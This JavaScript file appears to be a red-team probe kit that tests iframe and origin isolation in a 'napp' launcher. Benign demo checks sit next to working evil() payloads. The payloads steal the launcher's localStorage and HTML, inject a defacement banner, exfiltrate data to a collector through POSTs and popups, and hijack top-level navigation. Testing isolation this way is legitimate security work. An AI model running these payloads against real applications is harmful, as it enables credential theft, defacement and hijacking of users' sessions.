// evil-01 — frame & origin isolation (tier 0). NAPP.md says each napp runs at
// its own origin in a sandboxed iframe, that window.parent is cross-origin,
// and that "the bridge is its only channel to the launcher" — but none of
// that is protocol; it is all launcher policy. These probes attack every
// isolation *must* a launcher can get wrong, with real payloads behind the gate.
window.__EVIL_KIT__ = [
  {
    label: 'origin-collision nappId pair (naive slug scheme)',
    note: 'Origin derivation is launcher policy, not protocol. The reference retired its first scheme because `a~b` and `a-b` sanitized to one label and served each other\'s files. Under any slug-of-the-id scheme this id pair collides into ONE origin: the victim\'s localStorage, IndexedDB, files and service worker all become the attacker\'s.',
    data: {
      victimNappId: 'evil-01-frame-escape',
      evilNappId: 'evil~01~frame~escape',
      bothSlugTo: 'evil-01-frame-escape',
    },
  },
];

// The top-nav probe's once-per-document latch: a relaunched frame must never
// navigate again (its referrer/sessionStorage signals come first) — no loop.
let navAttempted = false;

const ATTACKS = [
  {
    id: 'launcher-origin',
    name: 'launcher-origin equivalence',
    target: 'NAPP.md: "window.parent is cross-origin" — never serve napp bytes from the launcher\'s own origin',
    severity: 'critical',
    harm: 'A napp served from the launcher\'s origin reads the launcher\'s DOM and localStorage — permission grants, remembered sign/publish decisions, open-window state — and can script every other napp frame. The bridge becomes irrelevant: full launcher compromise.',
    evilBrief: 'Dumps EVERY key/value of the launcher\'s localStorage (including the harness canary nsec and fake grant record), copies the launcher document (first 4KB), injects a red "EVIL NAPP EXECUTED HERE" banner into the launcher DOM (visible, easy to clean), and POSTs everything to the collector.',
    async demo() {
      let title = null;
      try {
        title = window.parent.document.title;
      } catch (e) {
        return blocked('window.parent.document threw: ' + errMsg(e).slice(0, 90) + ' — launcher origin held, parent is cross-origin');
      }
      let ls = 0;
      try { ls = window.parent.localStorage.length; } catch (_) {}
      return armed(
        'parent document READABLE (title: ' + mask(title, 24) + ') — the napp runs at the launcher\'s own origin; ' +
        ls + ' launcher localStorage key(s) one step away (grants, decisions, state)'
      );
    },
    async evil() {
      const out = {};
      try {
        const p = window.parent;
        const data = {};
        const ls = p.localStorage;
        for (let i = 0; i < ls.length; i++) { const k = ls.key(i); data[k] = ls.getItem(k); }
        out.launcherLocalStorage = data;
        out.launcherLocalStorageKeys = Object.keys(data);
        out.launcherTitle = p.document.title;
        out.launcherHTML = p.document.documentElement.outerHTML.slice(0, 4096);
        const el = p.document.createElement('div');
        el.id = '__evil01_pwned_banner__';
        el.textContent = '⚠ EVIL NAPP EXECUTED HERE — frame escape proof ' + new Date().toISOString();
        el.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#b007;color:#fff;font:700 13px ui-monospace,monospace;padding:6px;text-align:center';
        p.document.body && p.document.body.appendChild(el);
        out.defacedLauncher = true;
      } catch (e) { out.error = 'denied: ' + errMsg(e); }
      out.exfil = await sendToCollector('launcher-origin-theft', {
        keys: out.launcherLocalStorageKeys,
        sample: out.launcherLocalStorage,
        html: out.launcherHTML ? out.launcherHTML.length + ' chars' : null,
      });
      return out;
    },
  },
  {
    id: 'origin-collision',
    name: 'cross-napp origin collision',
    target: 'NAPP.md never specifies origin derivation — a naive label scheme collides napps into one origin',
    severity: 'critical',
    harm: 'Two napps whose ids slug to one origin share everything: localStorage, IndexedDB, service worker, and the launcher\'s message demux. The attacker reads the victim\'s persisted secrets, and any file/bytes the victim installs are served to the attacker\'s frames too.',
    evilBrief: 'Reads the victim app\'s persisted secret (seeded by the harness) and every other key at this shared origin, and POSTs them in full to the collector.',
    async demo() {
      let v = null;
      try { v = localStorage.getItem('__victim_secret__'); } catch (e) {
        return blocked('localStorage unreachable at this origin: ' + errMsg(e).slice(0, 90));
      }
      if (v != null) {
        return armed(
          'victim secret READABLE at my origin: ' + mask(v, 10) + ' — my origin is the victim\'s origin ' +
          '(label collision: the launcher derived one origin for two nappIds)'
        );
      }
      let n = 0;
      try { n = localStorage.length; } catch (_) {}
      return blocked('own origin only — no victim residue here (' + n + ' key(s), none foreign). Origin derivation held: one origin per napp.');
    },
    async evil() {
      const out = {};
      try {
        const data = {};
        for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); data[k] = localStorage.getItem(k); }
        out.sharedOriginStorage = data;
        out.victimSecret = data['__victim_secret__'] || null;
      } catch (e) { out.error = 'denied: ' + errMsg(e); }
      out.exfil = await sendToCollector('origin-collision-theft', { storage: out.sharedOriginStorage });
      return out;
    },
  },
  {
    id: 'popup',
    name: 'popup escape',
    target: 'the sandbox must not permit popups (no allow-popups)',
    severity: 'high',
    harm: 'window.open creates a browsing context outside every frame and every origin CSP — an exfiltration and phishing channel the launcher cannot observe or police.',
    evilBrief: 'Opens a REAL popup at the collector URL with a captured summary (origin, instance id, referrer, bridge surface) in the query string.',
    async demo() {
      let w = null;
      try { w = window.open('about:blank'); } catch (e) {
        return blocked('window.open() threw: ' + errMsg(e).slice(0, 90) + ' — popups held by the sandbox');
      }
      if (!w) return blocked('window.open() returned null — popups held by the sandbox');
      try { w.close(); } catch (_) { /* ignore */ }
      return armed('window.open() succeeded — popup channel open (probe window closed immediately)');
    },
    async evil() {
      const url = state.collector + '?ev=popup-exfil&payload=' + encodeURIComponent(captureSummary());
      let w = null;
      try { w = window.open(url); } catch (e) { return { attempted: url, result: errMsg(e) }; }
      return { attempted: url, opened: !!w };
    },
  },
  {
    id: 'referrer',
    name: 'referrer leak',
    target: 'NAPP.md is silent on Referrer-Policy — the napp document sees the launcher URL',
    severity: 'high',
    harm: 'document.referrer inside the napp carries the launcher URL — including share-link action payloads (?action=…&payload=…) — unless the launcher serves the napp HTML with a strict policy. Every napp learns what the launcher was asked to open.',
    evilBrief: 'Reads document.referrer (the launcher URL and its query) and POSTs it to the collector.',
    async demo() {
      const r = document.referrer;
      if (!r) return na('document.referrer is empty — nothing leaked');
      if (/[?#]/.test(r)) {
        return armed('referrer leaks the launcher URL AND its payload: ' + mask(r, 52));
      }
      return na('referrer is origin-only: ' + mask(r, 32) + ' — the default strict policy held the launcher\'s URL and share payload back (leak the full URL by serving napp HTML with a leaky Referrer-Policy)');
    },
    async evil() {
      const out = { referrer: document.referrer };
      out.exfil = await sendToCollector('referrer', out);
      return out;
    },
  },
  {
    id: 'frame-census',
    name: 'frame census & sibling scriptability',
    target: 'cross-origin Window accessibles — parent.length and parent.frames are always readable',
    severity: 'high',
    harm: 'Any napp can count the launcher\'s frames (other napps, hidden boot frames) from any origin — a composition side channel NAPP.md never mentions. Under an origin mistake the census becomes full sibling access: DOM, storage, and the sibling\'s bridge identity.',
    evilBrief: 'Counts the launcher\'s frames and siblings, attempts scripting on every sibling frame, and POSTs the census to the collector.',
    async demo() {
      let n = null;
      try { n = window.parent.length; } catch (e) { return blocked(errMsg(e)); }
      // classify every sibling: scriptable (same-origin with me) vs held.
      // Own-origin boot frames are scriptable BY DESIGN (the launcher keeps
      // the boot frame at the napp's own origin) — that is why the boot
      // channel must sender-check. Anything else scriptable is another NAPP.
      const boots = [];
      const nappSiblings = [];
      let held = 0;
      try {
        for (let i = 0; i < window.parent.frames.length; i++) {
          try {
            const fr = window.parent.frames[i];
            if (fr === window) continue;
            const d = fr.document;
            const title = (d && (d.title || '')) || 'untitled';
            if (/napp boot/i.test(title)) boots.push(title);
            else nappSiblings.push(title + ' @ ' + (d.location && d.location.href || '?'));
          } catch (_) { held++; /* cross-origin sibling: held */ }
        }
      } catch (e) { /* parent.frames unreachable */ }
      const parts = ['parent.length = ' + n + ' — ' + held + ' held cross-origin, ' + boots.length + ' scriptable boot frame(s), ' + nappSiblings.length + ' scriptable NAPP sibling(s)'];
      if (nappSiblings.length > 0) {
        return armed(
          nappSiblings.length + ' NAPP sibling frame(s) SCRIPTABLE — same-origin with me: ' +
          nappSiblings.slice(0, 3).map(t => mask(t, 24)).join(', ') +
          ' (their DOM, storage and bridge identity are mine). ' + parts[0] +
          ' — an origin mistake gave me other napps, not just my own boot frames'
        );
      }
      if (n > 1) {
        return armed(
          'frame census open: ' + parts[0] +
          (boots.length ? ' — the boot frames are my OWN origin (by design: the launcher boots each napp at its origin), scriptable by me; the boot channel must therefore sender-check (see evil-03). ' : '') +
          'The counting channel itself is open from any origin (NAPP.md is silent on it).'
        );
      }
      return na('parent.length = ' + n + ' — alone in the launcher; the census channel exists but has nothing to count');
    },
    async evil() {
      const out = { parentLength: safeGet(() => window.parent.length) };
      out.scriptableTitles = [];
      try {
        for (let i = 0; i < window.parent.frames.length; i++) {
          try {
            const d = window.parent.frames[i].document;
            if (d) out.scriptableTitles.push(d.title || d.location.href || 'untitled');
          } catch (_) {}
        }
      } catch (_) {}
      out.exfil = await sendToCollector('frame-census', out);
      return out;
    },
  },
  {
    id: 'origin-storage',
    name: 'per-origin storage granted',
    target: 'NAPP.md: "Each napp has its own origin, so localStorage is its own" — authority by design',
    severity: 'info',
    harm: 'Not a misconfig: the NAPP model GRANTS every napp persistent, launcher-scoped storage forever (until uninstall). This row proves the channel; evil-07 weaponizes it for persistence that survives launcher reloads.',
    evilBrief: 'Writes a persistent marker key __evil01_origin_pwned__ to the napp\'s own origin (survives launcher reloads until you wipe the app) and POSTs the key list to the collector. The demo cleaned its marker up; this one does not.',
    async demo() {
      const key = '__evil01_probe__' + randId();
      const notes = [];
      try {
        localStorage.setItem(key, '1');
        const v = localStorage.getItem(key);
        localStorage.removeItem(key);
        if (v === '1') notes.push('localStorage');
      } catch (e) { notes.push('localStorage denied: ' + errMsg(e).slice(0, 60)); }
      try {
        const ok = await withTimeout(new Promise((res, rej) => {
          const r = indexedDB.open('__evil01_probe__');
          r.onsuccess = () => { try { r.result.close(); } catch (_) {} res(1); };
          r.onerror = () => rej(r.error || new Error('idb error'));
        }), 2000);
        if (ok === 1) notes.push('indexedDB');
      } catch (e) { notes.push('indexedDB denied: ' + errMsg(e).slice(0, 60)); }
      if (notes.some(n => /denied/.test(n) === false)) {
        return armed('BY DESIGN: persistent per-origin storage granted (' + notes.filter(n => !/denied/.test(n)).join(', ') + ') — marker key written+cleaned to prove it. This channel is the launcher\'s to police (wipe on uninstall), not the protocol\'s.');
      }
      return blocked(notes.join(' | '));
    },
    async evil() {
      const out = {};
      try {
        localStorage.setItem('__evil01_origin_pwned__', new Date().toISOString());
        out.persistedMarker = '__evil01_origin_pwned__ written to my origin (wipe me to remove it)';
        const keys = [];
        for (let i = 0; i < localStorage.length; i++) keys.push(localStorage.key(i));
        out.keys = keys;
      } catch (e) { out.error = errMsg(e); }
      out.exfil = await sendToCollector('origin-persist', { keys: out.keys });
      return out;
    },
  },
  {
    id: 'top-nav',
    name: 'ancestor navigation (shell hijack)',
    target: 'the sandbox must never permit top navigation (no allow-top-navigation, no missing sandbox)',
    severity: 'critical',
    destructive: true,
    harm: 'window.top.location.replace() navigates the whole launcher away — every open napp, all launcher state, gone. The shell is replaced by attacker content in what was a trusted tab.',
    evilBrief: 'Calls window.top.location.replace(collector?ev=shell-hijack&payload=…) — THE LAUNCHER TAB LEAVES FOR THE COLLECTOR AND THIS FRAME IS DESTROYED. Runs LAST so the log above survives. The launcher tab shows the collector\'s error page.',
    async demo() {
      // The only way to detect ancestor-navigation permission is to navigate.
      // A previous probe already did: the marker QUERY PARAM (referrers never
      // carry fragments, but they do carry query strings) or the sessionStorage
      // flag proves the launcher reloaded at a napp's command. Checked FIRST
      // so a relaunched frame never navigates again — no reload loop.
      if (/[?&]evil01nav=1/.test(document.referrer || '')) {
        clearNavProbeFlag();
        return armed('ancestor navigation PERMITTED — my referrer carries the probe\'s marker param: a previous probe replaced the launcher\'s location, the launcher reloaded at my command and relaunched me (this is the relaunched frame)');
      }
      const flag = navProbeFlag();
      if (flag) {
        clearNavProbeFlag();
        return armed('ancestor navigation PERMITTED — a previous probe run at ' + flag + ' replaced the launcher\'s location and the launcher reloaded at my command (this is the relaunched frame)');
      }
      // Same-origin with top: navigation is trivially permitted (and readable).
      try {
        const h = window.top.location.href;
        return armed('window.top.location READABLE (same-origin with the launcher): ' + mask(h, 48) + ' — top is mine to navigate');
      } catch (_) { /* cross-origin: held, as it should be */ }
      if (navAttempted) {
        return na('this document already issued its one navigation probe and no cross-reload signal came back — cannot confirm without executing; use VERY EVIL mode to test the channel for real');
      }
      // Cross-origin: attempt the documented ROE-exception probe — ONCE per
      // document — reload the launcher at its OWN current URL with a marker
      // query param. Reversible; if the sandbox holds, replace() throws.
      navAttempted = true;
      let base = null;
      try { base = (document.referrer || '').split('#')[0]; } catch (_) {}
      if (!base || !/^https?:/.test(base)) {
        try {
          const ao = location.ancestorOrigins;
          const topOrigin = ao && ao[ao.length - 1];
          if (topOrigin) base = topOrigin + '/';
        } catch (_) {}
      }
      if (!base) return na('no launcher URL derivable (referrer empty, ancestorOrigins unavailable) — cannot attempt the probe');
      const target = base + (base.includes('?') ? '&' : '?') + 'evil01nav=1';
      setNavProbeFlag();
      try {
        window.top.location.replace(target);
        return armed('top.location.replace() ISSUED toward the launcher\'s own URL with a marker param — if the launcher reloads with ?evil01nav=1, the channel is open (see the relaunched frame)');
      } catch (e) {
        clearNavProbeFlag();
        return blocked('top.location.replace() threw: ' + errMsg(e).slice(0, 100) + ' — ancestor navigation held');
      }
    },
    async evil() {
      const url = state.collector + '?ev=shell-hijack&payload=' + encodeURIComponent(captureSummary());
      const out = { attempted: url };
      try {
        window.top.location.replace(url);
        out.result = 'navigation issued — if the launcher is still here it was held; otherwise you are reading the collector error page';
      } catch (e) { out.result = 'denied: ' + errMsg(e); }
      return out;
    },
  },
];
